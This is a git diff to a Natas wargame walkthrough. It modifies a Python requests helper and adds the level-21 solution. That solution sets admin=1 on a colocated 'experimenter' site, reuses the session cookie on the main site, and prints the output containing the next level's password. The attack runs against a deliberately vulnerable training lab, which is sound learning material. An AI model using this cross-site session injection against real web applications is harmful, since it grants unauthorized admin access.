@@ -20,11 +20,17 @@ https://overthewire.org/wargames/natas/
 
 ## NatasX
 ```python
-def natasX(x, pwd, endpoint="", headers={}, cookies={}, data={}):
-    url = f'http://natas{x}.natas.labs.overthewire.org/{endpoint}'
-    username = f"natas{x}"
+import requests
 
-    r = requests.get(url, auth=(username, pwd), headers=headers, cookies=cookies, params=data)
+def natasX(x, pwd, endpoint="", headers={}, cookies={}, data={}, url=""):
+    if url != "":
+        username = f"natas{x}"
+        r = requests.get(url, auth=(username, pwd), headers=headers, cookies=cookies, params=data)
+    else:
+        url = f'http://natas{x}.natas.labs.overthewire.org/{endpoint}'
+        username = f"natas{x}"
+
+        r = requests.get(url, auth=(username, pwd), headers=headers, cookies=cookies, params=data)
 
     return r
  ```
@@ -1161,11 +1167,40 @@ https://overthewire.org/wargames/natas/natas21.html
 > URL:      http://natas21.natas.labs.overthewire.org
 
 ```python
+import natasX
+
+natas = natasX
+
+sid = natas.natasX(21, "IFekPyrQXftziDEsUr3x21sYuahypdgJ", endpoint="index.php", url="http://natas21-experimenter.natas.labs.overthewire.org", data={"submit": "1", "admin": "1"}).cookies.get("PHPSESSID")
+print(natas.natasX(21,"IFekPyrQXftziDEsUr3x21sYuahypdgJ", endpoint="index.php", cookies={"PHPSESSID": sid}).text)
 ```
 
 **Output**
 
 ```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas21", "pass": "IFekPyrQXftziDEsUr3x21sYuahypdgJ" };</script></head>
+<body>
+<h1>natas21</h1>
+<div id="content">
+<p>
+<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
+</p>
+
+You are an admin. The credentials for the next level are:<br><pre>Username: natas22
+Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</pre>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
 ```
 
 ## Natas22
